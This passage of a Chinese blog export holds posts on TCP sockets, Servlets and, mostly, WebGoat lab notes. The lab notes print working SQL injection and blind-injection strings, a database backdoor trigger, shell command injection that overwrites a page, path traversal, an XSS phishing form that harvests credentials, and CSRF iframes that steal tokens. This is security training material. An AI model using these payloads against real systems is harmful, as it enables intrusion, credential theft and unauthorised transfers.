Socket是什么TCP/IP这些概念性的东西讲完了,但是和编程有毛线关系呢,这是不少初学者的一个困惑.和编程有关系的就是Socket,Socket是TCP/IP的实现 Socket本身就是TCP/IP的一个规范,就是大家都约定好了函数名和函数调用顺序. 因为TCP/IP报文很复杂,而且是二进制流(人眼看不懂),不可能让每个开发者自己去检查3次握手(见下文讲解). 通过约定好的Socket规范,程序员就可以方便的进行数据的发送和传输.其主要函数包括 初始化函数int socket(int domain, int type, int protocol); 绑定函数int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 监听函数int listen(int sockfd, int backlog); 链接函数int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 接收函数int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 其详细作用可以参考这篇文章,其中绑定函数是服务端调用,而链接函数则是客户端调用 Socket的历史七十年代中，美国国防部高研署(DARPA)将TCP/IP的软件提供给加利福尼亚大学Berkeley分校后，TCP/IP很快被集成到Unix中，同时出现了许多成熟的TCP/IP应用程序接口(API)。这个API称为Socket接口。九十年代初，由Microsoft联合了其他几家公司共同制定了一套 WINDOWS下的网络编程接口，即Windows Sockets规范。 三次握手怎么实现的三次握手是通过TCP报文中的序号与标记实现的,TCP报文的结构需要看书自己学习,这里仅仅对稀泥蟹使用图解进行解释 第一次握手第一次握手：客户端向服务器发送连接请求包，标志位SYN（同步序号）置为1，序号为X=0 第二次握手第二次握手,服务器收到客户端发过来报文 由SYN=1知道客户端要求建立联机。 向客户端返回一个SYN和ACK都置为1的TCP报文 设置返回报文中初始序号Y=0，将确认序号(Acknowledgement Number)设置为客户的序列号加1，即X+1 = 0+1=1, 如下图 第二次握手报文 第三次握手第三次握手：客户端收到服务器发来的包后检查确认序号(Acknowledgement Number)是否正确 第一次发送的序号加1（X+1=1） 以及标志位ACK是否为1。 若正确，服务器再次发送确认包，ACK标志位为1，SYN标志位为0。确认序号(Acknowledgement Number)=Y+1=0+1=1，发送序号为X+1=1。客户端收到后确认序号值与ACK=1则连接建立成功","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Socket","slug":"Socket","permalink":"http://yoursite.com/tags/Socket/"},{"name":"TCP","slug":"TCP","permalink":"http://yoursite.com/tags/TCP/"},{"name":"IP","slug":"IP","permalink":"http://yoursite.com/tags/IP/"}]},{"title":"HTTP和Servlet的关系","date":"2016-03-13T15:00:00.000Z","path":"2016/03/14/HTTP和Servlet的关系/","text":"HTTP服务端如何工作在另一篇文章里我总结了HTTP的报文如何工作的,这些对于前端工作者已经足够了,只需要发送请求然后接收返回报文就可以了.但是当你发送HTTP报文到服务端时,服务端都进行了哪些操作呢? 就像前文中总结,HTTP本身是应用层协议,其在传输层TCP协议的上层,已经可以通过工具将二进制流转化为人的肉眼可以看懂的字符串,就如同阅读文章一样. 所以说HTTP报文本质上还是电报,是一张表格,有着固定的格式.通过实现约定好的格式我们可以区分出报文头,报文头中的字段,以及报文体.那么问题来了,我要去报文头中某个字段的时候怎么让计算机去取呢? Servlet的诞生聪明的少年们说,你不是说都是字符串么,我就分割字符串好了.其实原理也就是这么简单,但是HTTP请求这么频繁,每次都分割多累啊. 聪明的少年又说,那我就写个函数,通过函数来取就好了.但是如果下次我要取另外一个字段呢?你要准备多少个函数? 聪明的少年说,那我就封装成一个模型,带有参数和方法,将常用的变量赋值给参数,常用的方法用来取需要的字段. 经过以上三个步骤,就可以理解Servlet到底是什么了.Servlet就是对HTTP协议的封装,让其变成一个模型,方便开发者在服务端使用 Servlet的构成Java中的Servlet的Class叫做HttpServlet,主要包含以下函数 //公开的方法用来接收HTTP的请求,并且转交给Protect的Service方法 public void service(ServletRequest req, ServletResponse res) //分析请求,将ServletRequest对象转换成HttpServletRequest,同样处理Response protected void service(HttpServletRequest req, HttpServletResponse resp) //接受Service转发来的Get请求 protected void doGet(HttpServletRequest req, HttpServletResponse resp) //接受Service转发来的Post请求 protected void doPost(HttpServletRequest req, HttpServletResponse resp) 按照基本定义一个Servlet就是一个接口(框架中Servlet可能会是转发器),其接收到的所有请求都会进入Public的Service函数,同时执行以下操作 自动分析HTTP报文将其封装成Request对象 新建一个Response对象备用 转发到Protect的Service函数 分析HTTP方法,然后转发到对应的Do方法(doGet例如) 处理完毕将结果写入Reponse 返回HTTP报文 服务端处理由于Servlet的函数工作流程是确定的,所以我们可以通过重写其中任何一个方法,来在中间加入我们的逻辑代码,如我们处理所有的Get和Post请求,示例代码如下. public class ServletManager extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String controlStr = request.getParameter(&quot;control&quot;); response.sendRedirect(&quot;index.jsp&quot;); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; super.doGet(request, response); &#125; &#125; Servlet映射我们写好了一个Servlet,如何让它在网络上可以被访问到呢?这里就需要提到一个概念,连同Servlet在内的所有网络服务(例如网页),都可以打包成一个*.war文件放在服务器的webApp目录下,比如Tomcat或者Jetty. 当你的服务器启动后,就会自动加载这些*.war文件,也就是说你的服务已经发布了.接下来就是让别人通过URL地址访问你的时候可以获取HTTP返回.那么就需要Servlet映射. web.xml映射所有.war文件必须有个名为web.xml的配置文件,在配置文件中,让servlet-name与你的Class.java(servlet-class)文件对应,以及servlet-name与一个URL地址(url-pattern)对应. &lt;servlet&gt; &lt;servlet-name&gt;ServletManager&lt;/servlet-name&gt; &lt;servlet-class&gt;servlet.ServletManager&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ServletManager&lt;/servlet-name&gt; &lt;url-pattern&gt;/server&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 通过以上方式就可以在你的服务器地址基础上加上war包的路径和servlet的url-pattern访问到这个Servlet进行HTTP的请求和处理. 注解映射或者可以使用Servlet3.0,其本身为Java的注解 @WebServlet(name = &quot;ServletManager&quot;, urlPatterns = &quot;/server&quot;) public class OrderServlet extends HttpServlet &#123;&#125; 将一个Class标记被Servlet,同web.xml配置的效果是一样的.","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"HTTP","slug":"HTTP","permalink":"http://yoursite.com/tags/HTTP/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"}]},{"title":"WebGoat学习笔记(七):Challenge","date":"2016-03-12T15:00:00.000Z","path":"2016/03/13/WebGoat学习笔记(七)/","text":"Challenge大结局,先来吐槽一下,这个Challenge如果能不看答案做出来…我觉得就已经不是初学者了,总会出现各种开挂的步骤,或者说为了出题而出题,思路对了但是不选特定的选项就不会出结果…. 先来列举下这里用到了哪些知识 HTML源码审计 BASE64编码 SQL注入 命令行注入 其中每一个知识点用于 用于发现管理员帐号和密码 用来解析Cookie 用来对Cookie进行注入获取信用卡 用于查询js文件路径,和篡改网页 Stage1越权登录一般有两种方法 获取到管理员帐号 进行注入无效化密码 先对密码进行注入试一试 password&#39; OR &#39;1&#39;=&#39;1 发现不行,然后分析HTTP报文 发现输入可能可以注入的点有Username/Password/Submit/user/user(Cookie)这几个,用户名一般不能进行注入,密码又试验过了,还剩下user和user(Cookie) 发现Cookie中的User是个编码,先去看看是什么,通过尝试,发现Base64编解码发现Cookie中会存user参数 对两个都进行注入试试,先是user,然后把注入代码编码成Base64再放入user(Cookie) youaretheweakestlink&#39; OR &#39;1&#39;=&#39;1 eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ== 发现都不行,还是登录不进去,真是坑了大爹了…现在只好思考这个”youaretheweakestlink”是什么,所以去读HTML源码,发现了这一个 &lt;input name=&quot;user&quot; type=&quot;HIDDEN&quot; value=&quot;youaretheweakestlink&quot;&gt; 可以看到它的字段是name,难道是管理员帐号?所以使用这个登录一下,然后同时进行注入攻击,发现还是他娘的进不去…. 到这里我就跪了,万念俱灰…只要去打开youtube(你土鳖)看看答案 当我知道答案的时候…恨不得把作者打一顿….分明是在开挂! **首先总结一下,youaretheweakestlink作为用户名是猜对了,可是密码在哪呢?**只看到答案打开了一个链接 local:8080/WebGoat/source?source=true 把WebGoat后的都删掉,然后加上source,还要给source赋值为true….这个source尼玛哪里出现的啊…如果不赋值为true还不能看到源代码,在源代码的121行 121 private String pass = &quot;goodbye&quot;; 122 123 private String user = &quot;youaretheweakestlink&quot;; 可以看到密码”goodbye”…尝试登录发现进去了 Stage2第二步是让取出所有信用卡信息,这种根据以往的练习,肯定都是使用SQL注入让某个SELECT语句取出所有信息,根据BurpSuite的拦截信息或者Network来看的话,进入第二个页面之后,并没有任何请求出现,所以说注入点肯定还在登录的时候 依次对Username/Password/Submit/user/user(Cookie)这几个注入点进行检查,发现user(Cookie)进行注入就可以获得到所有信用卡信息,但是注意使用的是Base64编码后的信息 youaretheweakestlink&#39; OR &#39;1&#39;=&#39;1 //编码后注入代码为 eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ== Stage3第三步发现是各种网络协议的表单,根据经验判断(就是猜)这种表单一般有两种获取形式 利用SQL从数据库读取 利用cmd命令行得到 先尝试拦截报文,对file字段做SQL注入,发现没有效果.然后进行命令行注入,通用命令”ls” tcp &amp;&amp; ls 这里注意坑爹的事情 由于是为了出题而出题,只有tcp具有命令行注入功能,选其它的选项卡都不行,是因为Java在源代码里做判断,只在tcp时让其故意有注入漏洞.Youtube上视频是5.2版本的…使用的是ip进行的注入,耽搁了老子好久… 还有一点需要注意,Youtube上给出的注入命令是 &amp;&amp; pwd &amp;&amp; ls &amp;&amp; find -name &quot;webgoat_challenge_guest.jsp&quot; 这些指令在Mac下是无效的,Mac下需要的指令主要是find不一样 tcp; pwd; ls; find . -iname &quot;webgoat_challenge_guest.jsp&quot;; 通过命名行注入,我们可以得到webgoat_challenge_guest.jsp文件的地址 然后可以使用另外一段自定义的HTML文本代替webgoat_challenge_guest.jsp,原理是利用了命令行注入的 echo &quot;text&quot; &gt; file 意思是使用清空file的内容文本,填充”text”进入file,对应的另外一个 echo &quot;text&quot; &gt;&gt; file 保留file的内容文本,后续补充”text”,百度原理看这里,构造注入语句 tcp; echo &quot;&lt;html&gt;&lt;body&gt;Mission Complete&lt;/body&gt;&lt;/html&gt;&quot; &gt; WebGoat/webgoat-container/target/webgoat-container-7.1-SNAPSHOT/webgoat_challenge_guest.jsp Stage4任务完成了,WebGoat的练习题只能说坑爹坑爹十分坑爹…但是总体来说还是熟悉了常用的攻击手段…学到了不少东西","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(六)","date":"2016-03-11T15:00:00.000Z","path":"2016/03/12/WebGoat学习笔记(六)/","text":"Denial of Service-ZipBomb意思是突破2MB文件限制上传20MB的以上的东西,感觉应该是拦截某些Request,然后修改一些参数. 但是我拦截的Request的file字段都是[object file]不管传什么都没响应..感觉是坏掉了这道题 Denial of Service-Denial of Service from Multiple Logins解释了一下DDOS攻击的原理…就是访问的人太多了,多登录几次就好了 Insecure Communication-Insecure Login介绍了HTTP报文和HTTPS报文的区别,题目原意是让你 拦截HTTP报文看到密码 然后进入回答密码是多少 切换到HTTPS看看还能不能看到报文 但是切换到HTTPS之后,打不开网页,可能是WebGoat没有提供HTTPS的服务吧….题目坏掉了又 Insecure Storage-Encoding Basics讲了常见的编码基础,以及是否可以被解密,需要注意的是BASE64不是加密,而是一种编码,虽然英文都是Encode Malicious Execution-Malicious File Execution题目的目的是 前端会对上传的文件做本地检查 先上传满足检查的文件 拦截报文,修改成另外一个可执行文件如JSP 如果服务端没有检查,就能被执行 但是貌似题目坏掉了..别说恶意文件…正常图片都上传不了 Parameter Tampering-Bypass HTML Field Restrictions修改页面的HTML文本解除一些前端的限制,如按钮是否可用 Parameter Tampering-Exploit Hidden Fields查看HTML文本找到一些被打了Hidden标记的元素 Parameter Tampering-Exploit Unchecked Email找到被Hidden的Email或者通过拦截修改发送Email的地址 Parameter Tampering-Bypass Client Side JavaScript Validation修改存在页面上的JS文件使得前端的正则校验失效,从而给服务端发超出限制的字符 Session Management Flaws-Hijack a Session(有疑问)Session劫持,题目的本意是让你在两次登录生成不同的Session之间,估算哪个Session已经被人使用了,然后进行爆破….但是我没有做出来,BurpSuite没有找到对应的Session Analyze的地方. Session Management Flaws-Session FixationSession串改,题目的意思如下 你伪造一个带有Session的链接发送给别人,在邮件内容后加&amp;SID=WHAT 别人用你的链接进行了登录,使用账户密码Jane/tarzan 点击下一步发现&amp;SID=NOVALIDSESSION 此时你只需要用刚刚发送的Session值,就可以直接进入别人账户 原Session链接 WebGoat/start.mvc#attack/311/1800&amp;SID=NOVALIDSESSION 修改为Seesion链接 WebGoat/start.mvc#attack/311/1800&amp;SID=WHAT 进入Jane账户成功 Web Services-Create a SOAP Request&amp;WSDL Scanning简单介绍了什么是SOAP和WSDL,但是它提供的?WSDL我没有看到WSDL而是看到了一堆Error 具体学习Web Services的文章可以看这里 Web Services-Web Service SQL Injection&amp;Web Service SAX Injection利用Web Services进入SQL注入和SOAP报文注入,原理和其它注入攻击一样,由于WebGoat的Web Service服务有问题…也没有完成 Admin Functions-Report Card学习记录卡…没什么用","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(五):Injection","date":"2016-03-10T15:00:00.000Z","path":"2016/03/11/WebGoat学习笔记(五)/","text":"Injection Flaws-整个一章都在讲注入,由于注入的手段基本类似,主要是两点 提前闭合正常代码,输入恶意代码 处理由于闭合正常代码留下的尾巴 Injection Flaws-Command Injection这个的意思是进行命令行注入,因为有些操作后台都是通过命令行完成的,所以可以尝试输入Shell指令来进行注入,但是它喵的我按照它说的来怎么都完成不了…… Injection Flaws-Numeric SQL Injection数字SQL注入,这里说的一个SQL语句 SELECT * FROM weather_data WHERE station = [station] 可以拦截报文将station字段后补充 101 OR 1=1 整个语句就变成了 SELECT * FROM weather_data WHERE station = 101 OR 1=1 由于1=1恒成立,所以会遍历出所有的数据库表单 Injection Flaws-Log Spoofing日志伪造,这里是攻击者发现了日志生成的规则,通过注入恶意字符串,按照规则伪造出一条日志,在Username输入 Smith%0d%0aLogin Succeeded for username: admin 其中%0d和%0a为CRLF换行符,看到的输出为 Login failed for username: Smith Login Succeeded for username: admin 其实第二行完全是伪造出来的 Injection Flaws-String SQL Injection字符串注入,由于字符串是由’’包裹起来的,所以要注意格式,和数字注入原理一样 Erwin&#39; OR &#39;1&#39;=&#39;1 SQL拼接出来的结果是 SELECT * FROM user_data WHERE last_name = &#39;Erwin&#39; OR &#39;1&#39;=&#39;1&#39; Injection Flaws-LAB: SQL InjectionStage1-4其实还是展现了数字和字符串不同的注入方法,对password进行拦截,然后使用字符串注入,可以登录任意账户. 剩下的我并没有做出来,也没有Solution,感觉题目坏掉了.. Injection Flaws-Database Backdoors利用SQL输入插入后门,首先是一个SQL注入点,可以通过数字注入看到所有人的薪水,然后使用以下SQL指令可以修改薪水 101; update employee set salary=10000 更加高级的是插入后门,下边这个后门好象是创建新用户的时候会自动修改邮箱为你的邮箱 CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email=&#39;john@hackme.com&#39;WHERE userid = NEW.userid Injection Flaws-Blind Numeric SQL Injection数字盲注,有些时候存在SQL注入,但是获取不到我们需要的信息,此时可以通过SQL语句的条件判断,进行盲注. 比如我们知道一个cc_number=1111222233334444,但是想知道其pin在pins table里的值,可以使用盲注进行爆破,输入 101 AND ((SELECT pin FROM pins WHERE cc_number=&#39;1111222233334444&#39;) &gt; 10000 ); 对10000进行1-10000步长为1的爆破,可以发现返回报文的长度在2364和2365改变了…尝试用=2364进行请求,返回成功.那么其pin就为2364 Injection Flaws-Blind String SQL Injection字符串盲注,猜测cc_number=’4321432143214321’的用户名,使用了SQL里的SUBSTRING这个函数,每一个字母进行爆破,原理和数字盲注一样,但是这里爆破有一点小技巧 101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number=&#39;4321432143214321&#39;), 1, 1) = &#39;h&#39; ); 爆破技巧这里有两个爆破点,一个是SubString的第二个参数,一个是字母h,所以使用Cluster Bomb进行爆破 爆破点1 是1-10 10个可能性 爆破点2 是a-z和A-Z 52个可能性 那么一共就是520次可能性,Intruder的设置如下 可以看到报文有两种结果1333 1334,其中第一个爆破点为10的都是1334,而有一些不是,查看返回报文发现有两种 Invalid account number Account number is valid 爆破点1=10返回报文为1334是因为10比1-9多一位,那么对正确的报文进行搜索Fliter,得到结果 用户名爆破成功","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(四):XSS","date":"2016-03-09T15:00:00.000Z","path":"2016/03/10/WebGoat学习笔记(四)/","text":"Cross-Site Scripting (XSS)-Phishing with XSS简单的反射型XSS钓鱼演示 &lt;/form&gt; &lt;script&gt; function hack()&#123; XSSImage=new Image; XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot; + document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen. User Name = &quot; + document.phish.user.value + &quot; Password = &quot; + document.phish.pass.value); &#125; &lt;/script&gt; &lt;form name=&quot;phish&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;HR&gt; &lt;H2&gt;This feature requires account login:&lt;/H2&gt; &lt;br&gt; &lt;br&gt;Enter Username:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt; &lt;br&gt;Enter Password:&lt;br&gt; &lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt; &lt;/form&gt; &lt;br&gt; &lt;br&gt; &lt;HR&gt; 将上边的代码输入到文本框,XSS会造成一个钓鱼的登录界面,用来骗取登录账户和密码 Cross-Site Scripting (XSS)-LAB: Cross Site Scripting这是一篇系统的XSS介绍 Stage1-4这四个步骤介绍了储存型XSS,主要步骤如下 Tom的档案是可以编辑的,Jerry作为人力可以查看Tom的档案 Tom对自己的档案进行编辑,放入XSS代码,被储存到数据库 Jerry查看Tom档案时,咣当..中招了 然后Stage2和4给出了两种方法修复XSS 第一是对输入进行检查,进行编码,第二个是对输出进行编码,分为JS Encode和HTML Encode,整个1-4由于没有Soluition,而且貌似XSS已经是被修复后的状态,所以没法完成…感觉这节课也是坏掉的… Stage5-6这里是反射型XSS的教程,说是在SearchStaff有个反射型的XSS,可以通过输入那里注入代码,但是没能复现,可能也是坏掉了…Stage6必须在开发模式下,也不知道怎么做. Cross-Site Scripting (XSS)-Stored XSS Attacks讲述了一种最典型的储存型XSS的例子—-留言板. 留言板可以输入任何信息 没有进行输入输出编码,产生了XSS 用户A进行恶意留言 用户B点进来自动显示用户A的留言,中XSS Cross-Site Scripting (XSS)-Reflected XSS Attacks典型的反射型XSS掩饰,Enter your three digit access code:输入框有反射型XSS漏洞 Cross-Site Scripting (XSS)-Cross Site Request Forgery (CSRF)这里是一个储存型XSS和CSRF结合的示例,CSRF就是冒名登录,用代码伪造请求,详细看这里,这里是吧CSRF恶意代码利用储存型XSS放到了网页上,通过留言Message里输入 &lt;iframe src=&quot;attack?Screen=284&amp;amp;menu=900&amp;amp;transferFunds=5000&quot;&gt;&lt;/iframe&gt; 就可以看到储存型XSS会出发出一个转账页面,如果想这个页面被被害者发现 &lt;iframe src=&quot;attack?Screen=284&amp;amp;menu=900&amp;amp;transferFunds=5000&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;&lt;/iframe&gt; 通过宽高设置成1像素,隐藏掉这个页面 Cross-Site Scripting (XSS)-CSRF Prompt By-Pass这个就是利用CSRF进行冒名操作转账,留下恶意代码如下 &lt;iframe src=&quot;attack?Screen=282&amp;menu=900&amp;transferFunds=5000&quot; id=&quot;myFrame&quot; frameborder=&quot;1&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;800&quot; scrolling=yes height=&quot;300&quot; onload=&quot;document.getElementById(&#39;frame2&#39;).src=&#39;attack?Screen=282&amp;menu=900&amp;transferFunds=CONFIRM&#39;;&quot;&gt; &lt;/iframe&gt; &lt;iframe id=&quot;frame2&quot; frameborder=&quot;1&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;800&quot; scrolling=yes height=&quot;300&quot;&gt; &lt;/iframe&gt; 第一个iframe是进行转账5000 当第二个加载完毕,去获取第二个iframe执行转账确认按键 然后再下边事先构造好”id=frame2”的第二个iframe 根据刚刚的文章讲,预防CSRF的一个有效手段就是Token,但是Token在管理不严的情况下也是可以被窃取的 Cross-Site Scripting (XSS)-演示窃取Token后的CSRF &lt;script&gt; var tokensuffix; function readFrame1() &#123; var frameDoc = document.getElementById(&quot;frame1&quot;).contentDocument; var form = frameDoc.getElementsByTagName(&quot;form&quot;)[0]; tokensuffix = &#39;&amp;CSRFToken=&#39; + form.CSRFToken.value; loadFrame2(); &#125; function loadFrame2() &#123; var testFrame = document.getElementById(&quot;frame2&quot;); testFrame.src=&quot;attack?Screen=278&amp;menu=900&amp;transferFunds=5000&quot; + tokensuffix; &#125; &lt;/script&gt; &lt;iframe src=&quot;attack?Screen=278&amp;menu=900&amp;transferFunds=main&quot; onload=&quot;readFrame1();&quot; id=&quot;frame1&quot; frameborder=&quot;1&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;800&quot; scrolling=yes height=&quot;300&quot;&gt;&lt;/iframe&gt; &lt;iframe id=&quot;frame2&quot; frameborder=&quot;1&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;800&quot; scrolling=yes height=&quot;300&quot;&gt;&lt;/iframe&gt; 先加载main页面窃取Token 然后加载转账页面发送CSRF转账请求 Cross-Site Scripting (XSS)-HTTPOnly Test这里就是测试HTTPOnly在对第三方Cookie的管理的影响,被标记了HTTPOnly的Cookie不能被JS获取到.所以一般Session和Token最好放在带有标记的Cookie里 但是这里有个疑问,如果用户选择不同的DOM就可以打开关闭HTTPOnly的标记,是不是可以诱导用户先关掉呢…还是说这里也是为了出题而出题,只是伪造了HTTPOnly的效果 Improper Error Handling-Fail Open Authentication Scheme这一个章节主要是讲要对错误有处理,不然错误处理的不全面也可能造成漏洞,比如这里 输入webgoat帐号 然后输入任意密码 拦截Request报文 删掉密码这一个参数 这样也能登录成功,所以说明代码对获取不到密码这个参数时的错误处理不充分","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(三)","date":"2016-03-08T15:00:00.000Z","path":"2016/03/09/WebGoat学习笔记(三)/","text":"Authentication Flaws-Password Strength介绍了不同复杂度的密码需要破解的时间,给的网站 https://howsecureismypassword.net 尼玛根本打不开,已经不存在了貌似,翻墙也没有 Authentication Flaws-Forgot Password题目的所有目的都是告诉你有些忘记密码的问题太简单,可以直接猜出来….尼玛…猜出来..猜出来.. 输入admin 密码问你最喜欢的颜色 颜色不就没几种么 猜红黄绿三原色,然后green就猜中了 Authentication Flaws-Multi Level Login 1这个题目坏掉了,题目的本意是第二步提交TAN#值的时候,有个叫hidden_tan的隐藏参数,来告知客户端哪个TAN值被用掉了,只需要修改这个值,就可以再次利用被使用过的TAN 可是我使用Jane和tarzan登录之后,第二次再登录不能用了…不知道是不是我理解错了.还是!!真的坏掉了!! Authentication Flaws-Multi Level Login 2两步验证的错误,意思是让你使用Joe和banana这个账户来登录Jane,因为第二步有个input的值叫hidden_user,在使用了Joe登录后,用户信息会被存在这个字段在第二步发送,所以只需要修改这个字段为Jane,就可以登录Jane Buffer Overflows-Off-by-One Overflows这一章节是为了介绍内存溢出带来的危害…但是题目感觉是为了出题而出题,并没有真实还原一个内存溢出造成的BUG 第一步让你提交入住等级,姓名.房间号 第二步让你选择入住时间 选择成功会返回你的姓名和房间号 这里对第三个参数填充超级大的数据,比如大于4096位的字符串,就可能造成内存溢出漏洞,从而返回VIP客户的房间号和姓名 大坑来了这个题目的想法是好的,目的在于输入框输入位数有限制,那么可以通过拦截报文,然后使用Intruder进行爆破,填充超级大的数据来造成内存溢出,但是,这里并没有真正还原了一个内存溢出错误,而是通过以下代码 // And finally the check... if(param3.length() &gt; 4096) &#123; ec.addElement(new Input(Input.hidden, &quot;d&quot;, &quot;Johnathan&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;e&quot;, &quot;Ravern&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;f&quot;, &quot;4321&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;g&quot;, &quot;John&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;h&quot;, &quot;Smith&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;i&quot;, &quot;56&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;j&quot;, &quot;Ana&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;k&quot;, &quot;Arneta&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;l&quot;, &quot;78&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;m&quot;, &quot;Lewis&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;n&quot;, &quot;Hamilton&quot;)); ec.addElement(&quot;\\r\\n&quot;); ec.addElement(new Input(Input.hidden, &quot;o&quot;, &quot;9901&quot;)); ec.addElement(&quot;\\r\\n&quot;); s.setMessage(&quot;To complete the lesson, restart lesson and enter VIP first/last name&quot;); &#125; 仅仅是检查了第三个参数的长度,来增加返回报文,伪造了一个看似内存溢出的漏洞,十分坑爹….所以我还是不知道到底内存溢出漏洞咋产生的… 如何使用intruder爆破我们要爆破的是第二个界面点击”Accept Terms”的链接,拦截下之后点击”Action-Send to intruder” 选择Sniper模式 点击Clear清除所有爆破点,然后选中114这个房间号码,点击Add设置为爆破点 进入Payloads标签页 选择用Character Blocks(字符串块)填充 基础字符串是A,选择最短位数4096最长位数10240,步长50 这个Character Blocks是什么意思呢?就是代表用4096位的A开始然后50位50位的依次加长长度,直到达到10240位,然后点击Start Attack,查看大于4096位之后的结果,就可以看到模拟出的内存泄漏信息 Code Quality-Discover Clues in the HTML这一篇主要在讲,没事不要他娘的乱写备注…比如这个作者把管理员用户名密码写备注里了 &lt;!-- FIXME admin:adminpw --&gt; &lt;!-- Use Admin to regenerate database --&gt; Concurrency-Thread Safety Problems线程安全问题,有些程序员写代码的时候喜欢各种用Static/Const之类的,觉得自己对内存了如指掌,吊的不知道哪里去了.但是往往忽略了多线程的问题,比如这个问题的源码 private static String currentUser; private String originalUser; 这里currentUser使用了static静态变量,又没有做线程保护,就会造成浏览器Tab1访问这个页面时,Tab2同时访问,数据就会被替换掉 Concurrency-Shopping Cart Concurrency Flaw如上题一样,也是由于使用了静态变量却没有做线程保护,导致的购物车多线程支付问题.","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"WebGoat学习笔记(二)","date":"2016-03-07T15:00:00.000Z","path":"2016/03/08/WebGoat学习笔记(二)/","text":"WebGoat的大坑由于WebGoat不同的版本课程都不一样,所以说网上的资料也不全,我用的是7.1.0版本,先来上个图 而且**!!!最坑的是!!!**有些题根本他娘的没答案,或者答案是错的,开发版的题也不知道怎么做! Introduction这一章节教了你怎么用这个东西,以及怎么为这个组织贡献课程,主要就是3个选项,没什么实质教学内容 Java Source: 源码 Solution: 答案 Hints: 提示 General-Http Basics这一章节让你明白什么是Http,可以用BurpSuite拦截一下报文和我Blog中讲的基础进行验证下,Solution使用的拦截工具是WebScarab,单独安装比较难,可以在Kali中使用,但是我用的是BurpSuite,效果一样. Access Control Flaws-Using an Access Control Matrix这个就是让你初步理解权限的概念,点一点,找到谁的权限最大就可以了 Access Control Flaws-Bypass a Path Based Access Control Scheme这一节是让你利用拦截工具,改变参数,访问到原本不能访问的路径,在BurpSuite的Intercept里抓到这个请求 然后根据Hints提醒使用shell脚本里切换到上一级目录的指令”..”修改File的值”CSRF.html”构造出另外一个指令 ../../../../../WEB-INF/spring-security.xml 就可以访问到目标目录意外的文件,但是坑爹的是不论试验了多少次都提示我 * Access to file/directory &quot; ../../../../../WEB-INF/spring-security.xml&quot; denied 然后看Solution里说是访问main.jsp于是改为 ../../../../../main.jsp 课程通过…Hints和Solution根本不一样…这就是WebGoat的坑爹之处 Access Control Flaws-LAB: Role Based Access ControlStage 1: Bypass Business Layer Access Control权限管理问题,由于代码没有对Control里的Delete指令做权限管理,又通过action字段判断Control指令,所以原本不应该有Delete权限的Tom执行了Delete操作. 使用密码jerry进入Jerry Mouse的帐号,有ViewProfile和DeleteProfile的操作 使用密码tom进入Tom Cat的帐号,只有ViewProfile 执行ViewProfile拦截请求,改action为DeleteProfile Stage2说是需要在开发版下修复这个问题,没找到怎么修复. Stage 3: Bypass Data Layer Access 